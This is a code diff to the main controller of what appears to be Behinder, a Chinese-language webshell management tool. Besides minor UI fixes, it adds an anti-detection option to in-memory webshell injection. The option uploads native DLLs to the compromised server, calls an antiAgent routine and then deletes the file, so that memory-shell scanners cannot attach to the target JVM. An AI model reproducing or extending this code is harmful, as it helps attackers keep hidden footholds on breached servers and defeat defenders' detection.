@@ -35,6 +35,7 @@ import javafx.scene.Scene;
 import javafx.scene.control.Alert;
 import javafx.scene.control.Button;
 import javafx.scene.control.ButtonType;
+import javafx.scene.control.CheckBox;
 import javafx.scene.control.ComboBox;
 import javafx.scene.control.ContextMenu;
 import javafx.scene.control.Label;
@@ -58,6 +59,7 @@ import javafx.scene.input.Clipboard;
 import javafx.scene.input.ClipboardContent;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
+import javafx.scene.paint.Color;
 import javafx.stage.FileChooser;
 import javafx.stage.Stage;
 import javafx.stage.Window;
@@ -215,6 +217,7 @@ public class MainController {
          TextField passwordText = new TextField();
          Button cancelBtn = new Button("取消");
          Button saveBtn = new Button("保存");
+         saveBtn.setDefaultButton(true);
 
          try {
             JSONObject proxyObj = this.shellManager.findProxy("default");
@@ -263,7 +266,7 @@ public class MainController {
                } catch (Exception var13) {
                }
 
-               String type = null;
+               String type;
                if (!userNameText.getText().trim().equals("")) {
                   final String proxyUser = userNameText.getText().trim();
                   type = passwordText.getText();
@@ -430,12 +433,14 @@ public class MainController {
       return true;
    }
 
-   private void injectMemShell(int shellID, String type, String path) {
+   private void injectMemShell(int shellID, String type, String path, boolean isAntiAgent) {
+      this.statusLabel.setText("正在植入内存马……");
       Runnable runner = () -> {
          try {
             if (!path.startsWith("/")) {
                Platform.runLater(() -> {
                   Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
+                  this.statusLabel.setText("内存马植入错误，路径必须以\"/\"开头");
                });
                return;
             }
@@ -464,7 +469,7 @@ public class MainController {
 
             shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
             shellService.loadJar(libPath);
-            shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString("password")));
+            shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString("password")), isAntiAgent);
 
             try {
                String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
@@ -487,28 +492,34 @@ public class MainController {
                         nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                         shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                         shellService.freeFile(remoteUploadPath, libPath);
-                        shellService.antiAgent(remoteUploadPath);
+                        if (isAntiAgent) {
+                           shellService.antiAgent(remoteUploadPath);
+                        }
+
                         shellService.deleteFile(remoteUploadPath);
                      } else {
                         nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
                         shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                         shellService.freeFile(remoteUploadPath, libPath);
-                        shellService.antiAgent(remoteUploadPath);
+                        if (isAntiAgent) {
+                           shellService.antiAgent(remoteUploadPath);
+                        }
+
                         shellService.deleteFile(remoteUploadPath);
                      }
-                  } catch (Exception var18) {
-                     var18.printStackTrace();
+                  } catch (Exception var19) {
+                     var19.printStackTrace();
                   }
                }
-            } catch (Exception var19) {
+            } catch (Exception var20) {
                Platform.runLater(() -> {
-                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var19.getMessage());
+                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var20.getMessage());
                });
             }
-         } catch (Exception var20) {
-            var20.printStackTrace();
+         } catch (Exception var21) {
+            var21.printStackTrace();
             Platform.runLater(() -> {
-               this.statusLabel.setText("注入失败：" + var20.getMessage());
+               this.statusLabel.setText("注入失败：" + var21.getMessage());
             });
          }
 
@@ -543,8 +554,8 @@ public class MainController {
       this.idCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
             @Override
-            protected void updateItem(Object itemObj, boolean empty) {
-               super.updateItem(itemObj, empty);
+            protected void updateItem(Object item, boolean empty) {
+               super.updateItem(item, empty);
                this.setText((String)null);
                this.setGraphic((Node)null);
                if (!empty) {
@@ -560,12 +571,11 @@ public class MainController {
       this.statusCol.setCellFactory((col) -> {
          TableCell cell = new TableCell() {
             @Override
-            protected void updateItem(Object itemObj, boolean empty) {
-               super.updateItem(itemObj, empty);
+            protected void updateItem(Object item, boolean empty) {
+               super.updateItem(item, empty);
                if (empty) {
                   this.setGraphic((Node)null);
-               } else if(itemObj!=null){
-                  String item = itemObj.toString();
+               } else {
                   Object rowItem = this.getTableRow().getItem();
                   if (rowItem == null) {
                      this.setGraphic((Node)null);
@@ -592,7 +602,7 @@ public class MainController {
                         this.setAlignment(Pos.CENTER);
                      } catch (Exception var7) {
                         var7.printStackTrace();
-                        this.setText(item);
+                        this.setText((String)item);
                      }
 
                   }
@@ -695,6 +705,7 @@ public class MainController {
 
       });
       Button saveBtn = new Button("保存");
+      saveBtn.setDefaultButton(true);
       Button cancelBtn = new Button("取消");
       GridPane vpsInfoPane = new GridPane();
       GridPane.setMargin(vpsInfoPane, new Insets(20.0D, 0.0D, 0.0D, 0.0D));
@@ -884,7 +895,13 @@ public class MainController {
          this.copyString(url);
       });
       memShellBtn.setOnAction((event) -> {
+         Object selectObj = this.shellListTable.getSelectionModel().getSelectedItem();
+         if(selectObj==null){
+            Utils.showErrorMessage("提示", "请先选择网站。");
+            return;
+         }
          String scriptType = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_TYPE)).getValue();
+         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
          if (!scriptType.equals("jsp")) {
             Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
          } else {
@@ -912,14 +929,23 @@ public class MainController {
             pathLabel.setAlignment(Pos.CENTER_RIGHT);
             TextField pathText = new TextField();
             pathText.setPrefWidth(300.0D);
-            pathText.setPromptText("支持正则表达式，如/shell/memshell.*");
+            pathText.setPromptText(String.format("支持正则表达式，如%smemshell.*", Utils.getContextPath(url)));
+            pathText.focusedProperty().addListener((obs, oldVal, newVal) -> {
+               if (pathText.getText().equals("")) {
+                  pathText.setText(Utils.getContextPath(url) + "memshell");
+               }
+
+            });
+            CheckBox antiAgentCheckBox = new CheckBox("防检测");
+            Label antiAgentMemo = new Label("*防检测可避免目标JVM进程被注入，可避免内存查杀插件注入，同时容器重启前内存马也无法再次注入");
+            antiAgentMemo.setTextFill(Color.RED);
             Button cancelBtn = new Button("取消");
             Button saveBtn = new Button("保存");
+            saveBtn.setDefaultButton(true);
             saveBtn.setOnAction((e) -> {
-               this.statusLabel.setText("正在植入内存马……");
                String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
                String type = typeCombo.getValue().toString();
-               this.injectMemShell(Integer.parseInt(shellID), type, pathText.getText().trim());
+               this.injectMemShell(Integer.parseInt(shellID), type, pathText.getText().trim(), antiAgentCheckBox.isSelected());
                inputDialog.getDialogPane().getScene().getWindow().hide();
             });
             cancelBtn.setOnAction((e) -> {
@@ -929,13 +955,15 @@ public class MainController {
             injectGridPane.add(typeCombo, 1, 0);
             injectGridPane.add(pathLabel, 0, 1);
             injectGridPane.add(pathText, 1, 1);
+            injectGridPane.add(antiAgentCheckBox, 0, 2);
+            injectGridPane.add(antiAgentMemo, 0, 3, 2, 1);
             HBox buttonBox = new HBox();
             buttonBox.setSpacing(20.0D);
             buttonBox.setAlignment(Pos.CENTER);
             buttonBox.getChildren().add(cancelBtn);
             buttonBox.getChildren().add(saveBtn);
             GridPane.setColumnSpan(buttonBox, 2);
-            injectGridPane.add(buttonBox, 0, 2);
+            injectGridPane.add(buttonBox, 0, 4);
             inputDialog.getDialogPane().setContent(injectGridPane);
             inputDialog.showAndWait();
          }
@@ -974,6 +1002,7 @@ public class MainController {
    }
 
    private void loadShellList() throws Exception {
+      this.searchShellTxt.setText("");
       this.shellListTable.getItems().clear();
       JSONArray shellList = this.shellManager.listShell();
       this.fillShellRows(shellList);
@@ -1159,11 +1188,11 @@ public class MainController {
                }
             }
 
-            final int finalDuplicateCount = duplicateCount;
             final int finalCount = count;
+            final int fianlDuplicateCount = duplicateCount;
             Platform.runLater(() -> {
                this.statusLabel.setText("导入完成。");
-               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount));
+               Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), fianlDuplicateCount, finalCount));
 
                try {
                   this.loadShellList();
